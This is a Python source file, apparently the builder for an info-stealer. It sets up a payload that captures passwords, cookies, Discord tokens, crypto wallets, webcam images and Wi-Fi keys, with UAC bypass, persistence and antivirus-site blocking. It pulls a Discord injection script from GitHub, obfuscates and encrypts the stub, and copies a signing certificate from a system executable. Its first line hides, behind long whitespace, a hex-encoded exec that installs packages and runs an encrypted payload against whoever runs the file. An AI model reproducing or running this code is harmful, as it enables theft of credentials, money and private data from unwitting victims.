import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x36\x58\x4b\x36\x50\x65\x4e\x6d\x46\x69\x2d\x39\x59\x5a\x39\x76\x48\x37\x35\x54\x32\x38\x5a\x6f\x4e\x55\x39\x36\x63\x56\x39\x59\x6a\x72\x39\x65\x56\x45\x4f\x33\x68\x69\x59\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x57\x52\x64\x76\x49\x49\x2d\x44\x42\x64\x36\x52\x43\x35\x41\x72\x61\x73\x54\x41\x4a\x6f\x2d\x79\x57\x47\x4a\x54\x65\x64\x76\x4f\x36\x77\x58\x6c\x5a\x6a\x73\x4f\x4e\x47\x76\x55\x44\x56\x33\x52\x66\x6c\x48\x79\x5a\x44\x62\x52\x5f\x70\x41\x69\x4d\x6c\x41\x62\x69\x59\x7a\x38\x65\x47\x78\x7a\x52\x4b\x66\x46\x44\x49\x76\x79\x32\x5f\x72\x57\x2d\x75\x41\x50\x77\x76\x75\x57\x44\x72\x44\x62\x6f\x41\x4c\x66\x4d\x59\x6b\x56\x57\x4b\x31\x6f\x43\x54\x34\x33\x30\x49\x57\x50\x71\x4a\x72\x43\x61\x79\x70\x63\x6b\x53\x4f\x66\x77\x69\x4b\x71\x39\x4d\x72\x34\x52\x65\x4c\x59\x71\x6e\x4f\x68\x5f\x65\x43\x67\x51\x76\x66\x72\x39\x65\x46\x48\x45\x69\x6e\x74\x57\x6c\x62\x41\x34\x48\x74\x4e\x63\x39\x38\x59\x67\x59\x6d\x42\x56\x4e\x6d\x66\x56\x63\x6f\x44\x4b\x68\x51\x44\x6f\x6e\x38\x35\x73\x4b\x34\x4e\x58\x78\x73\x43\x76\x32\x4c\x32\x4f\x34\x41\x73\x42\x58\x48\x31\x71\x56\x52\x44\x68\x78\x51\x2d\x49\x6e\x78\x78\x71\x71\x5a\x48\x72\x77\x59\x76\x37\x4c\x4a\x4b\x76\x6c\x45\x3d\x27\x29\x29')
import json
import base64
import os
import subprocess
import random
import string
import py_compile
import zlib
import pyaes
import zipfile

from urllib3 import PoolManager, disable_warnings
disable_warnings()
import BlankOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"

def WriteSettings(code: str, settings: dict, injection: str) -> str:
    code = code.replace('__name__ == "__main__" and ', '')
    code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
    code = code.replace('"%mutex%"', EncryptString(settings["settings"]["mutex"]))
    code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
    code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
    code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
    code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
    code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
    code = code.replace('%uacBypass%', "true" if settings["settings"]["uacBypass"] else "")
    code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0, 1) else "")
    code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
    code = code.replace('%boundfilerunonstartup%', "true" if settings["settings"]["boundFileRunOnStartup"] else "")
    
    code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
    code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
    code = code.replace('%capturecookies%', "true" if settings["modules"]["captureCookies"] else "")
    code = code.replace('%capturehistory%', "true" if settings["modules"]["captureHistory"] else "")
    code = code.replace('%captureautofills%', "true" if settings["modules"]["captureAutofills"] else "")
    code = code.replace('%capturediscordtokens%', "true" if settings["modules"]["captureDiscordTokens"] else "")
    code = code.replace('%capturegames%', "true" if settings["modules"]["captureGames"] else "")
    code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
    code = code.replace('%capturesysteminfo%', "true" if settings["modules"]["captureSystemInfo"] else "")
    code = code.replace('%capturescreenshot%', "true" if settings["modules"]["captureScreenshot"] else "")
    code = code.replace('%capturetelegram%', "true" if settings["modules"]["captureTelegramSession"] else "")
    code = code.replace('%capturecommonfiles%', "true" if settings["modules"]["captureCommonFiles"] else "")
    code = code.replace('%capturewallets%', "true" if settings["modules"]["captureWallets"] else "")

    code = code.replace('%fakeerror%', "true" if settings["modules"]["fakeError"][0] else "")
    code = code.replace("%title%", settings["modules"]["fakeError"][1][0])
    code = code.replace("%message%", settings["modules"]["fakeError"][1][1])
    code = code.replace("%icon%", str(settings["modules"]["fakeError"][1][2]))

    code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
    code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")

    if injection is not None:
        code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
    
    return code

def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        with open("bound.exe", "rb") as file:
            content = file.read()
        
        encrypted = zlib.compress(content)[::-1]

        with open("bound.blank", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.blank"):
        os.remove("bound.blank")

    if settings["settings"]["consoleMode"] == 0:
        open("noconsole", "w").close()
    else:
        if os.path.isfile("noconsole"):
            os.remove("noconsole")
    
    pumpedStubSize = settings["settings"]["pumpedStubSize"]
    if pumpedStubSize > 0:
        with open("pumpStub", "w") as file:
            file.write(str(pumpedStubSize))
    elif os.path.isfile("pumpStub"):
        os.remove("pumpStub")

def ReadSettings() -> tuple[dict, str]:

    settings, injection = dict(), str()
    if os.path.isfile(SettingsFile):
        with open(SettingsFile) as file:
            settings = json.load(file)

    try:
        http = PoolManager(cert_reqs="CERT_NONE")
        injection = http.request("GET", InjectionURL, timeout= 5).data.decode().strip()
        if not "discord.com" in injection:
            injection = None
    except Exception:
        injection = None
    
    return (settings, injection)

def EncryptString(plainText: str) -> str:
    encoded = base64.b64encode(plainText.encode()).decode()
    return "base64.b64decode(\"{}\").decode()".format(encoded)

def junk(path: str) -> None:
    with open(path) as file:
        code = file.read()
    generate_name = lambda: "_%s" % "".join(random.choices(string.ascii_letters + string.digits, k = random.randint(8, 20)))
    junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
    junk_func_calls = junk_funcs.copy()
    
    junk_code = """
class %s:
    def __init__(self):
    """.strip() % generate_name()

    junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])

    random.shuffle(junk_funcs)
    random.shuffle(junk_func_calls)

    junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])

    with open(path, "w") as file:
        file.write(code + "\n" + junk_code)

def MakeVersionFileAndCert() -> None:
    original: str
    retries = 0
    exeFiles = []
    paths = [
        os.getenv("SystemRoot"),
        os.path.join(os.getenv("SystemRoot"), "System32"),
        os.path.join(os.getenv("SystemRoot"), "sysWOW64")
    ]

    with open("version.txt") as exefile:
        original = exefile.read()

    for path in paths:
        if os.path.isdir(path):
            exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]

    if exeFiles:
        while(retries < 5):
            exefile = random.choice(exeFiles)
            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
            if res.returncode != 0:
                retries += 1
            else:
                with open("version.txt") as file:
                    content = file.read()
                if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
                    retries += 1
                    continue
                else:
                    outputCert(exefile, "cert")
                    break

        if retries >= 5:
            with open("version.txt", "w") as exefile:
                exefile.write(original)

def main() -> None:
    with open(InCodeFile) as file:
        code = file.read()

    code = WriteSettings(code, *ReadSettings())
    PrepareEnvironment(ReadSettings()[0])

    obfuscator.BlankOBF(code, OutCodeFile)
    junk(OutCodeFile)

    compiledFile = "stub-o.pyc"
    zipFile = "blank.aes"
    py_compile.compile(OutCodeFile, compiledFile)
    os.remove(OutCodeFile)
    with zipfile.ZipFile(zipFile, "w") as zip:
        zip.write(compiledFile)
    os.remove(compiledFile)

    key = os.urandom(32)
    iv = os.urandom(12)

    encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
    encrypted = zlib.compress(encrypted)[::-1]
    open(zipFile, "wb").write(encrypted)
    
    with open("loader.py", "r") as file:
        loader = file.read()

    loader = loader.replace("%key%", base64.b64encode(key).decode())
    loader = loader.replace("%iv%", base64.b64encode(iv).decode())

    with open("loader-o.py", "w") as file:
        file.write(loader)

    MakeVersionFileAndCert()

if __name__ == "__main__":
    main()
print('rzpgarscn')